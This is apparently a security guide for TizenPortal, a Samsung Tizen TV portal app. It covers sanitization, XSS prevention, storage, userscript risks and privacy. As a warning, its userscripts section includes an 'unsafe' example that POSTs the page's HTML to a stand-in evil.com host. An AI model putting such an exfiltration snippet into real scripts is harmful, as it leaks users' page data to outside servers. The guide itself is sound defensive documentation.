# Security Guide

## Overview

TizenPortal is designed with security as a priority. This guide explains the security features, best practices, and considerations when using TizenPortal.

## Security Model

### Single-User Device

TizenPortal is designed for **single-user Samsung Tizen Smart TVs**. The security model assumes:

- ✅ Single user with physical access to the device
- ✅ No multi-user concerns or access control needed
- ✅ Data stored locally is not secret (site shortcuts, preferences)
- ✅ User is responsible for securing their own device

### Data Storage

**localStorage** is used for:
- Site cards (URLs, names, settings)
- User preferences (theme, navigation mode)
- Global userscripts
- Feature configuration

**Important:** All data is stored **unencrypted** in the browser's localStorage. This is appropriate for the single-user TV use case where data is not sensitive.

## Security Features

### 1. Input Sanitization

All user inputs are sanitized before use:

#### URL Sanitization

```javascript
// Enforces http/https protocols only
// Blocks: javascript:, data:, vbscript:, blob:, etc.
sanitizeUrl(userInput);
```

**Protected Against:**
- Protocol injection attacks
- XSS via `javascript:` URLs
- Data exfiltration via `data:` URIs

#### HTML Escaping

```javascript
// Escapes all HTML-significant characters
escapeHtml(userContent);
```

**Protected Against:**
- XSS via HTML injection
- Script tag injection
- Attribute injection

#### CSS Sanitization

```javascript
// Strips dangerous CSS constructs
sanitizeCss(userCSS);
```

**Blocks:**
- `@import` rules (external stylesheet loading)
- `url()` values (network requests)
- `expression()` (IE CSS expressions)
- `-moz-binding` (XBL binding)
- `javascript:` and `data:` protocols
- `</style>` tags (context breakout)

### 2. XSS Prevention

TizenPortal prevents cross-site scripting through:

- ✅ All user content escaped before DOM insertion
- ✅ `textContent` preferred over `innerHTML` for dynamic content
- ✅ Static HTML templates for UI structure
- ✅ No `eval()` or `document.write()`
- ✅ Safe DOM manipulation with `createElement()`

### 3. Cross-Origin Security

- Same-origin policy enforced by browser
- Cross-origin iframe access wrapped in try-catch
- PostMessage uses specific target origins (never `'*'`)
- Cross-origin document access gracefully fails

### 4. Storage Quota Handling

TizenPortal handles localStorage quota limits:

```javascript
// Safe storage with quota detection
safeLocalStorageSet(key, value);
// Returns: { success, error, message }
```

If quota is exceeded:
- User is notified via console error
- Data is not lost (operation fails safely)
- Recommendation to remove old cards/scripts

## Userscript Security

### ⚠️ Important Security Warning

**Userscripts run with full page access.** Only enable scripts that:

- ✅ **You wrote yourself**, OR
- ✅ **Come from trusted sources you verify**, OR
- ✅ **You've reviewed and understand the code**

### What Userscripts Can Do

Userscripts have access to:

- `window` - Full browser window object
- `document` - Complete DOM access
- `TizenPortal` - TizenPortal API
- `card` - Current site configuration
- `bundle` - Current bundle instance

### Potential Risks

Malicious userscripts could:

- ❌ Steal data from pages you visit
- ❌ Modify page behavior unexpectedly
- ❌ Access your TizenPortal configuration
- ❌ Send data to external servers

### Best Practices

1. **Review Code** - Always read userscript source before enabling
2. **Test Safely** - Test new scripts on non-sensitive sites first
3. **Minimal Scripts** - Only enable scripts you actively use
4. **Regular Audits** - Review enabled scripts periodically
5. **Trusted Sources** - Only use scripts from developers you trust

### Example: Safe Userscript

```javascript
// ✅ SAFE: Simple styling enhancement
(function() {
  var style = document.createElement('style');
  style.textContent = 'body { font-size: 1.2em; }';
  document.head.appendChild(style);
})();
```

### Example: Unsafe Userscript

```javascript
// ❌ UNSAFE: Sends data to external server
(function() {
  var data = document.body.innerHTML;
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: data
  });
})();
```

## Bundle Security

### Bundle Manifest Validation

All bundle manifests are validated before loading:

- Required fields checked (name, displayName, version, description)
- Type validation on all fields
- Whitelisted values for modes and options
- Array and object structure validation

Invalid manifests are rejected with error messages.

### Bundle Isolation

- Bundles are loaded per-site (not globally)
- Bundle CSS is scoped to the bundle's target site
- Bundle deactivation cleans up resources
- Userscripts are cleared when bundles change

### Built-in Bundles

TizenPortal includes vetted bundles:

- **Default** - Basic enhancements for all sites
- **Audiobookshelf** - Optimized for Audiobookshelf
- **Adblock** - Generic ad blocking (CSS-based)
- **Userscript Sandbox** - Safe userscript environment

All built-in bundles are reviewed and considered safe.

## Network Security

### HTTPS Enforcement

- URLs without protocols are prepended with `https://`
- Certificate validation is handled by the browser
- No certificate pinning (respects system trust store)

### External Resources

TizenPortal loads:

- ✅ Polyfills from npm packages (bundled at build time)
- ✅ User-specified site URLs (via cards)
- ✅ User-specified favicon URLs (optional)

TizenPortal does NOT:

- ❌ Load analytics or tracking scripts
- ❌ Send data to external servers
- ❌ Use third-party CDNs at runtime

## Privacy

### Data Collection

TizenPortal **does not collect any user data**.

- ✅ No analytics
- ✅ No tracking
- ✅ No telemetry
- ✅ No external API calls

### Local Data Only

All data stays on your device:

- Site cards stored in localStorage
- Preferences stored in localStorage
- Userscripts stored in localStorage
- No cloud sync or backup

### Browser History

- TizenPortal modifies browser history for clean URLs
- Hash parameters (`#tp=...`) are removed after reading
- Query parameters (`?tp=...`) are removed after reading
- This prevents payload data from appearing in browser history

## Security Audit

TizenPortal undergoes regular security reviews:

- **Latest Review:** February 11, 2026
- **Status:** ✅ APPROVED FOR USE
- **Vulnerabilities:** 0 critical, 0 high, 0 medium, 0 low (all issues resolved or accepted)
- **Dependencies:** 0 vulnerable packages

See `SECURITY-REVIEW.md` for the full security audit report.

## Reporting Security Issues

If you discover a security vulnerability in TizenPortal:

1. **Do NOT** open a public GitHub issue
2. Email the maintainer with details
3. Include steps to reproduce
4. Wait for acknowledgment before public disclosure

Responsible disclosure is appreciated.

## Security Best Practices for Users

### 1. Device Security

- Keep your Samsung TV's firmware updated
- Use a secure WiFi network
- Don't share your TV with untrusted users

### 2. Site Cards

- Only add sites you trust and use
- Review card URLs before adding
- Remove unused cards periodically

### 3. Userscripts

- Only enable scripts you understand
- Review script source code
- Disable unused scripts
- Be cautious with scripts from others

### 4. Bundles

- Use built-in bundles when available
- Review custom bundle code before use
- Check bundle manifests for validity

### 5. Updates

- Update TizenPortal regularly
- Check release notes for security fixes
- Follow the TizenBrew update process

## Security Checklist

Before using TizenPortal:

- [ ] I understand userscripts run with full page access
- [ ] I will only enable scripts I trust and have reviewed
- [ ] I will only add site cards for sites I use and trust
- [ ] I will keep TizenPortal updated to the latest version
- [ ] I will not share userscripts that access sensitive data

## Additional Resources

- [SECURITY-REVIEW.md](../SECURITY-REVIEW.md) - Full security audit report
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Web application security risks
- [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security) - Security best practices

---

**Last Updated:** February 11, 2026
